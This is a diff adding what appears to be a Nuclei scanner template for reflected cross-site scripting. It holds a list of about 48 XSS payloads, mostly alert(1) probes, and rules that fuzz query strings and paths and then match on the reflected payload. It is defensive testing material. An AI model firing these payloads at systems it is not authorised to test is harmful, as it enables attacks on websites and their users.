@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<script>alert(1)</script>"
+        - "<style>@keyframes x{}</style><figcaption style=\"animation-name:x\" onanimationstart=\"alert(1)\"></figcaption>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<menuitem draggable=\"true\" ondragend=\"alert(1)\">test</menuitem>"
+        - "<SCRIPT>alert(1)</script>"
+        - "<iframe srcdoc=\"&lt;script&gt;javascript:alert(1)&lt;/script&gt;\">"
+        - "<script>alert(\"XSS\")</script>"
+        - "<IMG SRC=x ONFOCUSIN=\"alert(1)\">"
+        - "<col onmouseover=\"alert(1)\">test</col>"
+        - "<script>alert(1)</script>"
+        - "<mark onmouseup=\"alert(1)\">test</mark>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></tr>"
+        - "<svg><object onload=alert(1) data=data:image/svg+xml,<html xmlns&#61;http://www.w3.org/1999/xhtml%3E"
+        - "<ul id=x tabindex=1 onactivate=alert(1)></ul><input autofocus>"
+        - "<style>:target {color:red;}</style><pre id=x style=\"transition:color 1s\" ontransitionend=alert(1)></pre>"
+        - "<style>@keyframes slidein {}</style><bdi style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bdi>"
+        - "<dl onmouseleave=\"alert(1)\">test</dl>"
+        - "<IMG SRC=\"onerror=javascript:alert(1)\">"
+        - "<frameset draggable=\"true\" ondragleave=\"alert(1)\">test</frameset>"
+        - "<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>"
+        - "<html draggable=\"true\" ondragend=\"alert(1)\">test</html>"
+        - "<;A HREF=\";<HTTP://HA.CKERS.ORG/XSS><>;XSS<;/A>;"
+        - "<html onkeydown=\"alert(1)\" contenteditable>test</html>"
+        - "<form><input type=\"text\" autofocus onfocusout=alert(1)></form>"
+        - "<video ondblclick=\"alert(1)\">test</video>"
+        - "<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>"
+        - "<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext>"
+        - "<iframe/onload=javascript:alert(1)><frame></frame>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>"
+        - "<script>alert(1)</script>"
+        - "<video src=validvideofile.avi onerror=javascript:alert(1)></video>"
+        - "<embed src=\"http://xss-payload-list.googlecode.com/svn/bc/2008-03-21/xss/vulnerable.html\"></embed>"
+        - "<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>"
+        - "<script>alert(1)</script>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>"
+        - "<style>:target {color:red;}</style><thead id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></thead>"
+        - "<basefont onclick=\"alert(1)\">test</basefont>"
+        - "<style>:target {color:red;}</style><bdi id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></bdi>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>"
+        - "<embed src=\"http://ha.ckers.org/js/xss.html\">"
+        - "<div draggable=\"true\" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>"
+        - "<canvas draggable=\"true\" ondragstart=\"alert(1)\">test</canvas>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>"
+        - "<video autoplay controls ontimeupdate=alert(1)><source src=\"validvideofile.mp4\" type=\"video/mp4\"></video>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>"
+        - "<html onkeydown=\"alert(1)\" contenteditable>test</html>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
